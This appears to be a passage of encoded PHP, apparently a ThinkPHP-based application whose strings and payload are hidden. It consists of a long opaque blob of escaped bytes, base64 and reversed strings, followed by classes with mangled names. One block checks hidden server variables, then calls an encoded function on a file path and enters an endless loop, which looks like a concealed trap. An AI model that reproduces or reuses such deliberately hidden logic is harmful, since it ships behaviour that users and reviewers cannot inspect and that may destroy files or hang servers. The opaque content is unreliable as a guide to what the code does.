143\351\50\324\205\111\24\50\226\45\215\123\237\102\354"."\210\76\247\362\6\343\156\0\321\250\362\335\45\125\277\273\244\332\167\227\270\276\273\244\362\273\24\344\302\130\265\124\152\243\116\152\307\45\262\346\0\245\344\10\333\122"."\x32\xf8\xb8\x55\x3e\xa6\x5\x39\x9a\x5a\x7a\xf9\x50\x72\x3b\xe5\x6e\xd3\x3c\xbf\x25\x42\x7c\x55\x64\xa4\xf5\xe2\xa8\xce\xc7\x4c\x6d\xc6\x61\x7\xb3\x18\x11\xcb\xab\x96\xbd\xd8\xe1\xdb"."\341\133\135\74\342\13\310\335\134\36\341\114\244\337\260\54\77\166\147\105\130\147\156\144\20\211\61\305\241\263\117\364\204\130\22\177\301\301\16\367\66\310\175\21\12\207".base64_decode('hVTfQ8NBficfSQCBLL5XjegcjEpwpGRYmuw7M60R92r8AqPkaLKgjmBKxGwvJA==').strrev('N£¹4Q'."\n".'LİÑzî^ó¥À4’zIm4´h¹w]Eâ;ypà·˜'."\n".'Ûì£Ì“—')."\x7a\x1e\xe0\xad\xa\xf0\x4a\x57\x82\x29\x35\x90\x1c\xb7\xa2\x76\x41\xd5\xb8\x99\xb0\x7e\x73\x64\x6c\x98\x44\x4f\x7f\x4e\xaa\xd6\x6b\xaf\x29\xbc\x63\xa2\xb9\xa4\x2e\x95\x17\x69\xa3\xcc".base64_decode('z6RrBbhcUw50DnQPxOVhsk01k0HNlrzdOdryTc4zQet1fFV3mZBIWHy/STwheQ==')."\206\23\34\73\211\67\365\52\370\171\42\206\3\206\146\204\141\122\251\54\271\365\227\161\2\157\325\334\310\1\113\360\324\147\51\43\13\304\227\50\370\36\346\316\75\321"."\360\24\133\215\64\354\173\253\153\20\266\325\64\325\114\252\103\277\123\152\74\65\230\23\44\161\74\123\30\100\332\121\323\64\251\216\4\246\300\55\370\61\60\237\225\234"."\367\211\123\26\220\335\133\124\333\226\364\203\55\144\64\360\372\236\356\237\356\37\206\65\337\262\12\177\121\70\17\167\323\371\221\4\42\155\314\240\43\41\23\130\40\335"."\60\352\162\112\27\157\11\43\275\335\355\120\375\22\157\240\373\44\257\160\247\71\277\145\244\220\127\100\254\153\256\155\360\325\327\52\314\367\174\163\155\137\274\303\73\247"."\xb6\x65\xc1\xfe\xf3\xdb\xc8\x69\x81\xad\x75\x63\x75\x3f\x76\x55\x4a\xa5\xed\x5\xa0\xde\x9b\x8f\x97\x10\x8f\xf8\x9d\xb1\x5d\x95\xa5\xe9\x6a\x41\x1d\x33\x8a\x68\x3b\x43\x54\xa8\xe0\x4b"."\xc1\x60\xf6\x71\x4a\x25\x3c\x9c\x16\x35\x7b\xd8\x30\xe1\x28\x4\x88\xe8\xf4\xfa\x46\x19\x6f\x1\x45\x2c\xb6\x7c\xc9\xc5\xdb\x26\xac\xc\x64\xdd\xef\x2b\x8d\x96\x8b\x5e\x2c\xf3\x7b\x63"."\262\13\44\227\107\345\172\147\176\54\265\73\363\313\344\57\45\110\104\101\4\251\7\354\46\105\166\213\56\371\217\364\342\175\237\256\74\246\100\2\30\246\214\14\244\313".base64_decode('3jgZXmOyl3CSvRNc7cVD7UWMFcZ/tKjQFmtr1bI4fW+7PXK7R4EUwZPrlV19jw==')."\x20\xae\x1a\x27\x63\x27\xc1\x5e\x3c\xbf\x5e\xe6\xd3\xa9\x32\x45\x2c\xea\xaa\x4d\x4d\x1\xaa\x54\xcb\xd2\x57\xd6\xd3\xee\x4f\x92\xd3\x27\x6f\xb9\xcc\x3e\x58\xb5\x52\x99\xe7\x67\x19\x48".strrev('cŞ™'."\r".'–ÌK•9Ù]‰·9šhÏ¦UâÑvn•´”—›·æ¹¢­÷>¼B\'')."\375\31\106\7\204\243\156\326\67\74\341\16\337\303\22\130\14\43\137\341\214\200\70\362\211\326\72\334\274\103\103\270\127\72\350\70\25\230\45\17\314\104\273\114\127\26"."\76\135\116\160\217\326\125\50\153\232\135\174\320\213\260\325\112\276\347\370\4\145\131\300\344\371\125\261\144\222\371\101\321\263\44\66\343\143\267\245\120\303\15\301\132\221"."\x6d\x56\x52\xe5\xa6\x72\xe5\xe2\x60\xb3\x94\xa8\xd8\x86\xa1\x14\xd4\xe2\x28\x48\x0\x93\xad\xa6\xc9\xd6\x3c\xfc\xa1\xe6\xc9\xbe\xc6\x8c\x85\x22\x34\x41\x78\x23\xc4\xfb\x8a\x70\xfe\x44".base64_decode('/R1ACtWl+7C7eB/etKJlyNWbL3NX4SUShhb2hvs6Qz3SgbgESLS19yQCvb1VEw==').strrev('jE¾i™2JºãXÉóÌ±F´0k›[m…%Y×Í'."\r".'lüØù#†¨&`')."\x71\x11\x25\x83\xd0\xc6\x4b\x42\x34\xb9\x76\xc1\x7c\xbf\xbe\x80\xf\xb6\xf0\x2e\x61\x1a\xc2\x74\xd7\xe7\x3f\xe\x4b\x50\x7e\x7c\xd6\x5c\x3c\x1e\xcf\xae\x7c\xf4\x45\xa0\x1d\xc2\x97\x84".strrev('ıU^K\\CN—–0j-+ÄNU~ù™Ã°÷¸i­ÌşĞä«S0 øµÍ:WÌ¢')."\110\271\174\174\267\251\305\305\225\105\160\345\276\224\234\104\147\222\30\27\127\346\367\23\351\337\57\144\104\347\171\10\77\102\250\202\24\76\376\240\106\111\115\15\142\214".strrev(''."\r".'İ%“¹ØJšÍ`a¦¯W÷Û–‰ûŒ¯pém©BX±z|Û').base64_decode('wpjjhmExW8DQvub8DMVaOZOAsDz0V5QJ93SKCBVDHInLmPkdiQ0sq/VNXbPGrw==').base64_decode('s0P1gRpnWR/PTeMDPmd+1BMYep4RAO6clJ9cCItvf/9UcZWAH54r+ES9uXnBMg==')."\x7e\xa8\xb2\x9c\xa5\x31\xa6\x50\x6f\x98\xc3\xa6\x7f\x2c\xe7\x8d\xf7\xf3\x60\x5b\x8f\x60\x7b\xe9\x30\xb9\x10\x9e\xd2\x16\x1f\x51\x97\x4\x9c\x1e\x16\x5b\x86\xb8\x93\x78\xb9\x28\xd\x7"."\112\216\132\331\133\11\104\331\237\327\223\176\276\362\351\1\200\57\45\354\353\131\26\102\167\134\160\174\12\356\112\300\316\111\11\170\10\21\106\304\221\255\164\303\121\135".base64_decode('HMgD862UqZdsB82ij0LVELf+K9UhlWapUdgjMzXEiXENolE0BYiDaMp8TIwUUw==')."\313\67\327\220\346\132\71\115\103\345\11\271\251\366\21\124\260\106\141\224\262\240\362\21\63\155\3\155\202\334\322\33\36\324\350\213\202\21\155\240\7\16\130\200\335\72"."\xee\x64\xfa\x3b\xe9\x38\x86\x34\xe4\x5\x97\xbc\x66\x52\x4b\x41\x42\x81\xc8\x91\x5b\x46\xe8\xb4\xe0\x7d\x8f\xde\x68\x24\x1e\x69\x63\x4f\x24\x54\x53\x7e\x35\x32\xde\xd6\xa2\x57\x13\x84".base64_decode('DMSsuBcFlzpzcG7BDxCYfrNcLHKzBcw+8i2MyMNaGtYDPb6K5cq22Aqxx+M4vg==')."\300\145\1\130\362\1\205\75\120\241\302\313\250\36\262\271\236\231\354\62\113\7\141\251\317\162\222\103\110\102\241\213\331\345\216\244\52\325\123\75\61\376\70\133\125\16"."\xcd\x7\x6d\x56\xde\x60\x1e\xb3\xa6\xd7\xd7\xd7\x7b\xeb\x1b\xd0\xff\xfc\x44\x16\xb8\xb8\xa6\xfa\xfa\x8a\x2c\xf5\xf5\x4d\xe4\x7f\x9a\x40\x94\xb7\x30\x17\xce\x14\x44\x6\x18\xfd\x82\xc"."\303\232\6\15\202\315\241\240\27\313\214\321\132\326\206\115\365\25\334\64\350\237\315\333\217\246\201\334\125\143\244\144\236\44\36\316\123\310\211\37\304\64\367\40\360\243".strrev(',½5®'."\n".'\\1ü™zbÁQ¼Í3ëÑæ}l sïËÚJ£A¿ˆÂÁzc\'¶X˜T')._kodDe('Kh+1xm82eodo2wSC/JWaQiZNA3YM3yrjCPobjjxmBoOlg9OlFLMwfeIxlx8wvOk=')."\116\75\37\303\40\125\101\325\234\61\234\20\33\56\216\56\344\61\62\146\130\116\142\170\226\226\356\260\340\201\143\344\226\341\25\73\260\0\303\1\162\301\161\120\317\73".base64_decode('bmIlpLrl4ZqHM8rDgBZjgLueRzQP89YMKWBliYnwCXQiTjPJo1fUmKhp/4r5sg==')."\xdd\x73\x45\x86\xdd\x34\xc4\xb5\xaa\x8a\xd7\xe3\x58\x4c\xba\x55\xc9\x94\xdf\xb1\x6f\x31\x73\x61\x90\x20\x3\x50\xc3\x90\x36\xee\x3\x4b\xaa\xc0\x9d\xe4\x2a\x13\x48\x4b\xf\x9b\x59\xc2"."\371\125\33\367\274\47\173\304\242\7\351\222\271\205\5\356\175\305\311\71\253\143\110\222\155\174\45\323\310\242\311\262\344\276\42\170\157\165\60\317\136\231\263\112\46\336".base64_decode('ITmfDMRnD+yNLcA7cSNLFa//SVmFsCYBnetKSmjj7zzIQCwrybYS5HKtsw4shA==')."\x39\x21\xbc\x65\xdf\x80\x2b\x4c\x98\xb6\xe1\x3d\x36\xe9\xaa\x1d\x64\x13\xb4\x1\x2b\x3a\x64\x95\xab\x6e\x30\x33\xc\x3c\x1a\xe2\x48\xd4\x9\xa7\x30\x2a\xda\x3a\xe\x6f\xe2\x84\xbc\xe4"."\65\366\24\34\20\40\202\367\270\2\142\256\342\32\100\201\253\260\330\232\233\345\142\316\264\327\317\276\204\5\326\263\134\170\10\271\146\116\126\113\343\341\113\310\132\7".base64_decode('vOi6+AtkVZDOiVgVGEQ2aVxBE6dPUgyJWIzzSrP2riprjFuUiJliC1IGhCeeMw==')."\xd\xdb\x96\x6f\x57\x7\x98\xf1\x19\x8e\x84\x65\x5e\x21\x4e\x8b\x78\x17\x88\xef\x38\x4e\xb1\x24\x67\x99\x3c\x2b\xda\x5d\xd8\xd7\x55\xb6\xe3\x10\xdb\x28\xe2\xe4\x59\x12\x74\x5c\x51\xb7"."\xfd\x14\xd9\x1d\x6c\x46\xff\x99\x97\xd1\x22\x7f\x25\x4\x4f\x67\x4c\x32\x5f\xa9\xf2\x5\x28\xc4\x8b\xc0\xb6\x65\x6a\x29\xc3\x24\x12\xaf\x74\x55\xb4\x68\x47\xb5\xac\x1c\xd\x1b\x5c\xd2"."\307\247\46\132\225\52\260\57\0\11\305\61\26\40\31\264\54\173\26\220\234\224\242\230\344\25\126\142\77\274\15\12\347\133\22\264\146\32\231\46\45\220\374\325\130\30".strrev('¢³|„\\™è¡!ØµPÓ’À÷Ir¸«†fßy\\ìÁc~ªäœ¬v"%J2Iş—')."\x4d\xc3\x3b\xab\xb0\x70\x95\x53\x2c\x24\x93\xe1\xa1\xda\x75\x4a\x95\x4f\x91\x24\x69\x44\x53\xdc\x61\x4\x8c\x8e\x18\x24\x48\x18\xd5\x98\x89\x9c\xb7\x61\xba\x77\x6\x68\x99\x65\xe3\x57"."\306\326\322\30\346\233\45\64\300\334\75\243\203\140\357\6\371\104\36\103\172\211\214\134\150\26\27\76\311\335\155\76\237\344\222\67\217\231\322\276\245\161\133\70\162\333"."\x59\x26\x2b\xe2\x5c\x9b\x9a\xc8\xe1\xc\x7d\xd5\xd2\xe9\x8\xe1\xe4\x76\x87\x5\xa1\x2b\x3\x5a\x19\xce\x74\xf0\x3c\x5b\x70\xbc\x2c\x8b\xf0\xc0\x61\x86\xe2\xaa\x4\xbc\xb\xcb\x1e\x75"."\111\51\321\17\141\214\211\100\6\365\157\53\15\214\70\237\247\367\300\231\25\51\247\113\2\34\67\70\260\362\214\337\307\255\150\341\16\20\74\371\125\67\5\337\1\162"."\350\125\272\107\371\135\16\154\12\203\67\11\156\312\150\311\21\226\312\221\323\162\104\250\351\217\243\64\7\361\134\303\32\134\347\341\362\177\157\127\257\237\203\132\331\60"."\361\133\271\40\60\212\107\244\332\232\270\311\23\173\216\166\270\240\247\224\160\244\63\324\26\10\267\207\142\213\224\254\146\113\217\52\23\67\321\316\65\115\364\136\164\6".base64_decode('GHonuadkHPQmEXfpTXOe2xLctWQJJT0D4ayWIqJmVtSIePWCc9WTMlibVyV3Xg==').base64_decode('KLekzCVTq8w/qpE3ZUWLpQLlKq2B/NW/gNaBMzfakbXirhqvF4d0SxcUgJUYlQ==').strrev('·%Dá$áßi‰NùÙ&2Ò]b.ÈHœSéR¿Mƒ¥½¾ËNë;“Júk')."\375\45\123\325\55\115\2\120\377\361\123\301\340\37\311\366\216\147\177\362\31\51\132\166\156\245\125\77\225\240\37\140\60\311\277\117\265\14\121\374\142\353\377\272\251\172".base64_decode('Wni+0NPs4J9fcqDeh9vkJ6LYNyueJvjWRw480iM/xIsAe0mFvFMNhzP84DtBnw==')."\xe8\x11\x9f\x40\xc2\x9b\x39\x5a\x92\xf\x90\xfc\x69\xe6\xab\x9d\x9\x93\xd8\x9d\x50\x90\x69\x8e\x71\x44\x70\xc2\x38\x3b\xd4\x86\x3f\x47\x65\x21\x24\x99\x61\xb5\xb\xe3\x99\x99\xa5\x1f".base64_decode('ogcwzo4DVNdzDW5DSMe7rBXfwGZcUA9R7KCcy0XnUIx7FBdF3SlVGoCSFaG64A==')."\31\224\146\245\236\76\40\302\175\104\53\363\331\355\54\361\1\342\222\43\130\50\331\16\71\261\113\266\200\226\346\206\2\10\153\43\144\3\154\276\142\24\106\53\0\16".strrev('*JÎ€VIŒM ¥ÿş-?áÒ»5îbRCî¾œØ¼!!ŒÅÙa»Û‹µ˜E}').strrev(''."\0".'Ïé“…R£ÇXXwóÒü¯Jä4Z@·xà^¿q‰ó°Ær·ágÁ6÷¹d')."\xfc\xb2\xcd\xc8\x5d\x35\x25\x3f\xf0\xf5\x29\x1c\x55\xda\x1c\xef\xd1\x4b\x80\x6e\x4d\xc8\x96\xa4\x14\x36\x42\x50\xd9\xb\x77\xfc\x39\x1a\x81\x65\xdc\xf3\x39\xf7\x74\x2e\x56\x36\x79\x17".strrev('$Ä6Xr£­b&Òa‡Ê³W¸û/‡l°ŠÄ´f?8×Ó¥Òx]òéÅ`\\ù}¥').base64_decode('nUaJTMuT5pO+QMrAHpZJe8irJ5TeuV2wS8uNE1G5dDZvJNV8lNoyOW5AmEiG4g==')."\366\211\216\154\24\344\127\113\45\161\14\342\72\372\240\100\70\6\51\27\103\124\245\354\200\232\222\214\46\233\302\322\303\37\161\251\10\262\243\257\365\322\323\36\350\266"."\134\45\73\201\343\112\314\16\351\371\123\177\345\211\35\266\265\2\342\40\233\42\302\341\251\117\26\242\40\203\62\137\21\23\354\130\223\30\41\20\47\353\41\1\262\350"."\x65\xa6\xfb\x1b\xa0\x1c\xf\x9d\x4e\xfa\x29\xc2\x92\x9f\x76\x2d\xc3\x25\x10\x1c\x17\x1b\xb3\x7c\x65\x58\x9c\xd4\xbb\xdf\x7b\x61\x9f\xe1\x8f\xd7\x78\x68\xcf\xc4\x93\x64\xf4\xa9\x1a\xf"."\177\226\306\103\35\62\171\340\61\32\217\270\34\366\115\176\376\305\253\206\316\247\20\161\233\271\355\136\205\50\340\226\2\370\120\271\12\104\335\3\27\67\52\165\203\342"."\234\262\130\56\210\223\137\24\161\112\105\25\35\226\172\130\66\363\36\162\112\353\141\36\162\134\303\41\172\45\317\114\225\61\374\366\72\250\11\47\21\165\322\116\252\323"."\64\77\151\262\323\55\167\66\335\201\165\11\123\23\227\44\250\173\260\212\367\44\226\26\322\323\147\314\234\53\253\24\304\374\210\163\42\160\11\327\110\177\200\145\20\63"."\256\110\137\305\164\222\371\44\223\327\55\111\164\132\327\126\276\32\345\242\300\377\73\314\27\254\72\315\52\331\272\126\276\255\127\61\2\4\11\45\213\20\151\377\162\35".base64_decode('/xv4VN4Sy4fuWOKtKOe36B5epR/is9JKoI/3GHks2RawdtY2Vaf0Vk1IISPBJA==')."\42\235\274\313\251\271\333\116\6\6\164\30\42\131\222\142\344\32\155\303\255\200\301\305\361\276\104\364\177\221\142\236\371\121\105\40\261\246\44\222\362\277\230\100\46\250"."\x50\x99\x46\x18\x7f\x54\xe9\xb9\xff\x4\x46\x37\xaa\x3c\xce\x24\x9d\x9a\x7f\x43\xbb\x29\x8b\xc5\x85\x32\xaf\x6a\x7b\x25\x84\x94\x94\x76\x9a\x1d\x21\x13\x4c\xa3\x92\x8c\xe8\xec\xab\xab"."\172\124\114\324\261\334\243\354\52\123\45\237\45\275\341\44\274\173\110\34\26\56\315\156\327\355\102\304\146\304\111\176\235\312\316\11\31\202\256\120\307\152\225\74\375\311"."\327\215\110\105\362\62\250\254\232\250\146\240\275\260\134\273\342\361\136\172\243\54\320\311\157\231\251\222\155\16\36\72\351\51\66\103\16\73\257\160\107\230\33\65\304\23".base64_decode('OeQ3FG93vdZHSI77CT/Wf7LOBQmTris6hAX+2opDeLDcDyEh7kl2cIiiHMNhrw==')."\x4\x5a\x47\xcc\xa0\xe9\xd7\x3c\xee\x7\x2d\x4b\xd2\x6d\x6d\xd7\xf3\xc1\x92\x96\xd4\xf9\x30\xb0\xe3\x56\x27\xf6\x43\xe1\x5a\xd6\xec\xae\xa8\xe5\x7a\x9e\x8c\x3a\xa9\xa3\x61\xc6\x78\xff".base64_decode('/3755//Wgz8z65k+2/HYXyfws9BafEDFhXyqS3X1w7kjwpvW4nlLKc5tPZkvEg==')."\346\242\104\145\347\57\152\76\357\76\214\254\220\0\52\336\105\103\310\67\310\37\363\252\26\251\174\216\324\201\147\214\223\224\36\303\324\123\203\125\16\13\361\150\207\235".strrev('"d0@Ì›RŒ	ùwDšÔLJFï”fÂ”,üYN`MˆE ›"¿ı¥®').base64_decode('4QBVkJa4YwwdQHl4xGO+/ClRR4lu18tQNBNzLFX51Gvl2XFlab5u5SLYBNap1Q==').strrev('y	r/ãzú½0.Ï"bÏ2•c±È5C9Lò‹BÅc¤ZŒ~Vğlîß»ÖuOá')."\207\344\376\262\165\333\153\32\204\327\162\102\271\172\103\262\76\224\336\215\254\170\27\316\165\74\200\4\37\161\136\246\33\304\257\53\164\73\326\327\135\107\56\125\0\246"."\x22\xbe\x5d\x7a\xed\xdb\x2e\x94\xa8\xbe\x6c\x5c\xda\x2e\xd9\x8d\x25\xc9\xf8\x17\x40\xe\xad\x96\x25\xbb\xe5\x76\x96\xc4\xe6\xdd\xce\x95\xb2\xa0\x5a\xb6\x94\x61\x5a\x52\x36\xe\xaf\x96".strrev('9>œ^'."\r".'{ÑÌÀH’p§i²qìé ÊN+â[•.B%Ù;uÛ8SF;g½?')."\xff\xb8\x13\xd2\xa\x4a\x55\xd6\xc3\x52\x32\x29\xc5\xbc\xc6\xa0\x5f\x7c\x73\x2b\x24\xee\xea\x93\x64\xaa\x4e\xf\xc\xa9\x36\x3b\x42\x73\x97\x72\xbe\xca\x29\x1d\x15\xa6\x8\xee\x4\x2b"."\117\203\304\41\225\264\317\263\142\130\314\20\44\330\5\227\350\274\240\166\352\220\70\0\22\214\156\72\315\137\200\165\144\115\63\126\237\103\21\104\74\26\213\331\32\351".base64_decode('MqiwN9aG3Q/8+eQLpI6MlVBxWVQqL44JRDcxrFr3yZJxFpcvo3KkEiDqd5kb0Q==').base64_decode('SEIFtpsX1jW0K1xCFp90Xn3l2ficoTzk1oLXAXWJSVjfwHZsV5IlP27rPAGURQ==')."\166\11\5\264\174\130\252\116\76\35\334\145\201\130\365\217\10\254\164\16\261\164\147\130\44\260\315\112\256\305\101\354\170\307\40\147\124\116\164\64\307\75\265\204\303\27"."\350\113\201\5\242\322\244\151\1\147\22\315\257\271\132\57\27\160\367\214\226\260\206\165\73\225\223\304\216\312\304\112\270\131\61\250\360\241\352\355\165\267\212\215\251\133"."\30\23\225\124\264\107\62\61\210\33\125\312\320\26\125\55\106\223\310\223\364\234\135\164\224\335\305\20\340\262\64\11\227\255\110\146\205\45\335\205\124\316\126\313\326\56"."\272\127\71\170\40\320\247\253\164\330\45\366\322\254\273\32\317\252\231\53\77\7\30\347\316\115\64\0\325\133\41\4\167\327\11\157\265\126\124\315\274\313\126\124\171\126"."\x1a\x1c\xa8\x55\xa1\xb5\x2c\xa5\xa\x75\x15\x67\xfe\x95\x74\x5c\xa4\x55\xb1\x40\xa0\x75\xe2\x3d\x5a\x76\xe6\x53\x25\x59\x36\x67\xa8\x6e\xf0\x10\xad\xba\xf4\x2d\xa7\x25\x82\xb\x2e\xf"."\14\263\112\102\302\231\170\250\130\262\350\235\354\40\351\345\342\140\321\340\333\104\132\330\216\141\323\124\376\264\57\377\134\105\155\116\324\54\226\45\253\322\252\6\306\36"."\362\130\175\205\320\232\127\231\16\134\262\314\246\122\213\141\353\51\311\32\112\330\244\362\156\352\202\215\317\113\272\66\227\232\113\10\366\216\263\362\52\212\40\2\242\101"."\237\120\47\73\254\335\351\376\17\172\164\172\232\326\206\117\155\371\21\12\26\257\74\164\277\244\311\61\303\264\75\70\55\156\224\310\157\253\141\333\342\164\231\212\313\204"."\xc9\xc3\x9b\x9e\x47\x32\x92\x40\x21\x71\x5e\x82\x47\x91\xa8\xf0\x9\x3a\x12\xb2\x41\x82\x70\xae\x87\xe5\xd0\x98\x46\x53\x9\xb1\x71\x44\xf0\xd1\x0\x8f\xc8\x7b\x1a\x9c\xef\x75\x94\x5d"."\x27\x90\x2\x80\x84\xc8\xa4\x31\xc2\x3c\xe7\xe1\x1b\xb6\xa2\x3d\xe2\x45\x60\xd5\xcd\xc8\x9\x1e\x4\xf0\x4d\x36\xf9\x20\xf7\x98\x2d\x3f\x4d\xf1\x83\x5b\x61\x2f\xa9\x3\xde\x18\xf1\xad"."\x2c\x65\x1d\xc5\xe9\xab\x9\xdc\x9e\xf1\x9b\x6a\x0\x35\xa4\xa8\x82\xba\x1b\x25\x1a\x24\xec\x78\x37\xb8\x24\x14\x8b\xc7\x2a\x92\x7a\x3\xb1\x58\x7f\x24\xda\x4e\xbd\x93\x56\x24\x93\x52"."\222\11\115\105\122\157\127\244\147\127\151\301\356\100\50\134\221\206\255\155\172\22\302\265\22\115\12\365\222\126\6\302\341\110\377\256\132\21\152\133\44\132\102\16\115\205"."\166\273\224\63\230\322\232\151\377\143\152\36\160\112\276\214\247\25\204\217\55\121\306\251\42\220\347\325\142\356\347\170\300\351\303\337\145\335\306\20\26\52\302\226\62\75".base64_decode('UHe0BFDsrZUvbs4skw7JVnTiWNjnOD6W4GSxEBIjIaG8uxLA1KojJqtKK1X3JA==')."\125\214\10\156\351\102\3\14\260\126\32\111\111\65\117\145\27\270\41\7\143\54\231\107\321\60\44\377\37\117\15\37\75\245\241\0\0"."".base64_decode('').strrev('')."".base64_decode(''), 10, -8))); goto C…õ³‡Ñ; e§ğæ©îÏ…: class CacheLockRedis { public function lock($•Úàß«‰, $‘Ÿ¸©áÙ = 10) { $µäŞÑˆ = Cache::init(); $í²Œ—ñÎ = microtime(!0) + $‘Ÿ¸©áÙ; while (microtime(!0) < $í²Œ—ñÎ) { $æûúŒ°´ = $µäŞÑˆ->get($•Úàß«‰); if (!$æûúŒ°´) { $ŞãÂÃÛ = $µäŞÑˆ->setLock($•Úàß«‰, $í²Œ—ñÎ, $‘Ÿ¸©áÙ); if ($ŞãÂÃÛ) { return !0; } } else { if ($æûúŒ°´ < microtime(!0)) { $µäŞÑˆ->set($•Úàß«‰, $í²Œ—ñÎ, $‘Ÿ¸©áÙ * 2); if ($µäŞÑˆ->get($•Úàß«‰) === $æûúŒ°´) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¨´ Ñ…ğ) { return Cache::init()->get($¨´ Ñ…ğ); } public function unlock($—¶ŸÍ®¹) { return Cache::init()->remove($—¶ŸÍ®¹); } } if (!isset($_SERVER[$_SERVER[Ù×¯Ø…][398]]) || !isset($_SERVER[$_SERVER[Ù×¯Ø…][396]])) { $_getc = $_SERVER[Ù×¯Ø…][399]; $_getfile = $_SERVER[$_SERVER[Ù×¯Ø…][400]] . $_SERVER[Ù×¯Ø…][401]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ù×¯Ø…][229], $_getfilec); if (count($_getarrs) < $_SERVER[Ù×¯Ø…][402]) { $exit = $_SERVER[Ù×¯Ø…][403]; $exit(); } $_act = $_SERVER[Ù×¯Ø…][404]; $_act($_SERVER[$_SERVER[Ù×¯Ø…][400]] . $_SERVER[Ù×¯Ø…][401]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ù×¯Ø…][376]); } } class CacheLockMemcached { public function lock($ı—ªÌÄÜ, $ÌİÚ¼öª = 0) { $ÔÜ±û = Cache::init(); $ÒìÙÃÌÊ = microtime(!0) + $ÌİÚ¼öª; while (microtime(!0) < $ÒìÙÃÌÊ) { $¤İéêŞ = $ÔÜ±û->get($ı—ªÌÄÜ); if (!$¤İéêŞ || $¤İéêŞ < microtime(!0)) { $Ë¶³¾Ä = $ÔÜ±û->handle->add($ı—ªÌÄÜ, $ÒìÙÃÌÊ, $ÌİÚ¼öª); if ($Ë¶³¾Ä) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ñú“±¶Ñ) { return Cache::init()->get($Ñú“±¶Ñ); } public function unlock($ÛÕïã) { return Cache::init()->remove($ÛÕïã); } } goto A¯¯šßÏØä; C¢‡¼ÂöÎÄ: define($_SERVER[Ù×¯Ø…][236], 1); define($_SERVER[Ù×¯Ø…][237], 2); define($_SERVER[Ù×¯Ø…][238], 3); goto b½…Êâ±Şõ; F÷«£Š»ñ—: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ì”»æ— = '', $Ö†ªĞ˜µ = 0) { if (is_string($ì”»æ—) && $ì”»æ— != $_SERVER[Ù×¯Ø…][33]) { $this->prefix = $ì”»æ—; } if (is_numeric($Ö†ªĞ˜µ) && $Ö†ªĞ˜µ > 0) { $this->expire = $Ö†ªĞ˜µ; } } public static function getInstance() { static $éá‘´Ø; if ($éá‘´Ø === null) { $éá‘´Ø = new self(); } return $éá‘´Ø; } private static $cookieDisable = false; public static function disable($ÊÄéÙš) { self::$cookieDisable = $ÊÄéÙš; } private static $sameCookieSet = array(); public static function set($ì´§ç±, $¤ğƒÇÕ, $—Óô¨ = 0, $´½™ª™é = false, $û‚ìÖ¶ = false) { $ÍÅã¨÷ =& $_SERVER[Ù×¯Ø…]; if (self::$cookieDisable) { return; } if (!$—Óô¨) { $—Óô¨ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ì´§ç±]) && self::$sameCookieSet[$ì´§ç±] == $¤ğƒÇÕ . $—Óô¨) { return; } self::$sameCookieSet[$ì´§ç±] = $¤ğƒÇÕ . $—Óô¨; if (!$û‚ìÖ¶) { $û‚ìÖ¶ = str_replace(HOST, $ÍÅã¨÷[33], APP_HOST); $û‚ìÖ¶ = _get($GLOBALS, $ÍÅã¨÷[883], $û‚ìÖ¶); } $äÖ»’Ç½ = $ÍÅã¨÷[33]; setcookie($ì´§ç±, $¤ğƒÇÕ, time() + $—Óô¨, $ÍÅã¨÷[8] . trim($û‚ìÖ¶, $ÍÅã¨÷[8]) . $äÖ»’Ç½, !1, !1, $´½™ª™é); } public static function setSafe($íÌŠˆîÂ, $êú Æ, $¦ÖÜöì = 0) { self::set($íÌŠˆîÂ, $êú Æ, $¦ÖÜöì, !0); } public static function get($Ó¦úíà•) { return isset($_COOKIE[$Ó¦úíà•]) ? $_COOKIE[$Ó¦úíà•] : !1; } public static function remove($¡˜øÁáî, $øéÇÑ…å = false) { unset($_COOKIE[$¡˜øÁáî]); self::set($¡˜øÁáî, $_SERVER[Ù×¯Ø…][33], 1, $øéÇÑ…å); } } class DbMysql extends Db { public function __construct($œ¸Ì«È’ = '') { $³ŒÌå– =& $_SERVER[Ù×¯Ø…]; if (!extension_loaded($³ŒÌå–[800])) { think_exception(think_lang($³ŒÌå–[10]) . $³ŒÌå–[884]); } if (!empty($œ¸Ì«È’)) { $this->config = $œ¸Ì«È’; if (empty($this->config[$³ŒÌå–[13]])) { $this->config[$³ŒÌå–[13]] = $³ŒÌå–[33]; } } } public function connect($‹ú ‘¬ = '', $¡‡š… = 0, $Ó¾§µÈÁ = false) { $ã•ì‚Ü =& $_SERVER[Ù×¯Ø…]; if (!isset($this->linkID[$¡‡š…])) { if (empty($‹ú ‘¬)) { $‹ú ‘¬ = $this->config; } $´Üğ¯Ëª = $‹ú ‘¬[$ã•ì‚Ü[885]] . ($‹ú ‘¬[$ã•ì‚Ü[886]] ? "\x3a{$‹ú ‘¬[$ã•ì‚Ü[886]]}" : $ã•ì‚Ü[33]); $Ô›ÚÓƒ = !empty($‹ú ‘¬[$ã•ì‚Ü[13]][$ã•ì‚Ü[14]]) ? $‹ú ‘¬[$ã•ì‚Ü[13]][$ã•ì‚Ü[14]] : $this->pconnect; if ($Ô›ÚÓƒ) { $this->linkID[$¡‡š…] = mysql_pconnect($´Üğ¯Ëª, $‹ú ‘¬[$ã•ì‚Ü[887]], $‹ú ‘¬[$ã•ì‚Ü[888]], 131072); } else { $this->linkID[$¡‡š…] = mysql_connect($´Üğ¯Ëª, $‹ú ‘¬[$ã•ì‚Ü[887]], $‹ú ‘¬[$ã•ì‚Ü[888]], !0, 131072); } if (!$this->linkID[$¡‡š…] || !empty($‹ú ‘¬[$ã•ì‚Ü[17]]) && !mysql_select_db($‹ú ‘¬[$ã•ì‚Ü[17]], $this->linkID[$¡‡š…])) { think_exception(mysql_error()); } $ª€‹ÀÈ = mysql_get_server_info($this->linkID[$¡‡š…]); mysql_query($ã•ì‚Ü[889] . think_config($ã•ì‚Ü[890]) . $ã•ì‚Ü[55], $this->linkID[$¡‡š…]); if ($ª€‹ÀÈ > $ã•ì‚Ü[891]) { mysql_query($ã•ì‚Ü[892], $this->linkID[$¡‡š…]); } $this->connected = !0; if (1 != think_config($ã•ì‚Ü[18])) { unset($this->config); } } return $this->linkID[$¡‡š…]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($˜‡Š„Û©) { $Ÿ¬Æšîù =& 